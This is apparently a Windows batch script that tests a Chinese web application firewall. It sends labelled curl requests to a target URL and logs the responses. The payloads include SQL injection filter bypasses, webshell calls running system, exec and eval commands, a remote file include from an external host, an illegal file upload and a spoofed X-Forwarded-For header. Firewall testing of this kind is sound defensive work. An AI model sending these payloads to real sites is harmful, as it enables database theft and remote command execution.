curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,+CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T30】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-字符串 unicode 编码============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%u0053%%u0045%%u004c%%u0045%%u0043%%u0054%%u0020%%u0046%%u0049%%u0045%%u004c%%u0044%%u0020%%u0046%%u0052%%u004f%%u004d%%u0020%%u0054%%u0041%%u0042%%u004c%%u0045′ >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T31】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-追加特制的字符串============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=%%221+AND+1=1+and+%%270having%%27=%%270having%%27%%22 >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T32】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-注释绕过============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T33】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-替换空格字符(“)与注释“/ * * /============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=SELECT//id//FROM/**/users >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T34】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-关键字前加注释============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=value%%27/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),+NULL,+NULL#/*!0AND+%%27QDWa%%27=%%27QDWa  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#T35】网站防护-网站漏洞防护-SQL注入防护-url防护-GET请求-宽字符绕过 GPC============[%URL%]============================================================ >> .\php\%OSlevel%-all.htm
curl -b "ASPSESSIONIDQCADTQCR=NPLJIIMBGGGDJKJPHKBGLDGF;"  %URL%?q=1%%bf%%27+AND+1=1+%%20  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S1 】网页浏览实时防护==========[%URL%xunjian-test/webshell-%%5B94%%5D/DOS.asp]================  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/DOS.asp  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S2  】网页浏览实时防护============[%URL%xunjian-test/webshell-%%5B94%%5D/111.aspx]===============  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/111.aspx   >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S3】网页浏览实时防护==========[%URL%xunjian-test/webshell-%%5B94%%5D/test.jsp]=================  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/test.jsp  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S4 】网页浏览实时防护=============[%URL%xunjian-test/webshell-%%5B94%%5D/456655.php]==============  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/456655.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S5 】网页浏览实时防护========[%URL%xunjian-test%%2fwebshell-%%5B94%%5D%%2fDOS%%2easp]===================  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/DOS%%2easp  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S6 】网页浏览实时防护========[%URL%xunjian-test/webshell-[94]/%E5%A4%8D%E4%BB%B6%20miansha.asp]===================  >> .\php\%OSlevel%-all.htm
curl   %URL%xunjian-test/webshell-%%5B94%%5D/%E5%A4%%8D%%E4%%BB%%B6%%20miansha.asp  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S7 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=passthru&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=passthru&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S8 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=system&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=system&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S9 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=exec&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=exec&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S10 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=shell_exec&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=shell_exec&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S11 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=eval&param=system(dir)%%3B"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=eval&param=dir%%3B" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S12 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=assert&param=system(dir)%%3B"]===================  >> .\php\%OSlevel%-all.htm
curl  "%URL%php-test/pima.php?func=assert&param=dir%%3B" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S13 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=include&param=http%%3A%%2F%%2Fupdate.yunsuo.com.cn%%2Fh.txt"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=include&param=http://update.yunsuo.com.cn/h.txt" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S14 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=proc_open&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=proc_open&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#S15 】网页浏览实时防护PHP========["%URL%php-test/pima.php?func=popen&param=dir"]===================  >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/pima.php?func=popen&param=dir" >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#H1 】http响应请求保护========[%URL%500.asp]===================  >> .\php\%OSlevel%-all.htm
curl   %URL%500.asp  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#H2 】http响应请求保护========[%URL%500.php]===================  >> .\php\%OSlevel%-all.htm
curl   %URL%500.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo "【#H3 】php请求防护========[%URL%php-test/3.php?a=system&b=dir]=================== " >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/3.php?a=system&b=dir"  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo "【#H4 】php请求防护========[%URL%php-test/3.php?a=assert&b=phpinfo();]=================== " >> .\php\%OSlevel%-all.htm
curl   "%URL%php-test/3.php?a=assert&b=phpinfo();"  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#H5 】php请求防护========[%URL%php-test/1.php?func=1.jpg]===================  >> .\php\%OSlevel%-all.htm
curl   %URL%php-test/1.php?func=1.jpg  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
::echo 【#H6 】php请求防护-验证高压线功能生效的情况下不影响php的正常运行========[%URL%php-test/4.php]===================  >> .\php\%OSlevel%-all.htm
::curl   %URL%php-test/4.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo 【#H7 】http响应请求保护-400状态码-并非所有网站都处理========[%URL%testindex.php]===================  >> .\php\%OSlevel%-all.htm
curl   -H "Host:123456" %URL%testindex.php  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm




set "t1=%time%"
if "%t1:~,2%" lss "%t:~,2%" set "add=+24"
set /a "times=(%t1:~,2%-%t:~,2%%add%)*360000+(1%t1:~3,2%%%100-1%t:~3,2%%%100)*6000+(1%t1:~6,2%%%100-1%t:~6,2%%%100)*100+(1%t1:~-2%%%100-1%t:~-2%%%100)"
echo 本次批处理运行时间为%times%ms 
echo . >> .\php\%OSlevel%-all.htm
echo 本次批处理运行时间为%times%ms >> .\php\%OSlevel%-all.htm

echo 【#20】 http请求防护-检查“X_Forwarded_For”头，只允许包含IPV4和IPV6======================================================================== >> .\php\%OSlevel%-all.htm
curl -H "X-Forwarded-For:select/**/from/**/where/**/as" %URL%  >> .\php\%OSlevel%-all.htm
echo . >> .\php\%OSlevel%-all.htm
echo "=========需设置文件上传防护规则保护upload目录只允许上传txt文件=====以下上传XLS文件到测试网站============="  >> .\php\%OSlevel%-all.htm
echo "upload test %OSLevel%-%times%.xls!!--看到这句话说明非法文件上传居然成功了!!" >> ./%OSLevel%-%times%.xls
curl -F file=@%OSLevel%-%times%.xls submit=Submit %URL%upload.php
echo "=========查看已上传XLS文件=============================="   >> .\php\%OSlevel%-all.htm
curl %URL%upload/%OSLevel%-%times%.xls   >> .\php\%OSlevel%-all.htm
del %OSLevel%-%times%.xls
ping 127.0.0.1 -n 60
::goto start

echo 【#18-1】 网站性能监控-出网流量-======================================================================== >> .\php\%OSlevel%-all.htm
aria2c.exe -s 10 %URL%d/AutoHotkey111403_Install.exe
del AutoHotkey111403_Install.exe*
echo . >> .\php\%OSlevel%-all.htm
::echo 【#18-2】 网站性能监控-入网流量-(POST请求总数为1000；并发用户数10）======================================================================== >> .\php\%OSlevel%-all.htm
::ab -w -n1000 -c10 -p post.test %URL%db/login.php
echo . >> .\php\%OSlevel%-all.htm
::echo 【#19】 流量防护-CC防护-(GET请求总数为1000；并发用户数10，该频率下IIS7和IIS8无法触发到CC）======================================================================== >> .\php\%OSlevel%-all.htm
::ab -w -n1000 -c10 %URL%db/login.php
echo . >> .\php\%OSlevel%-all.htm


::goto start
::pause
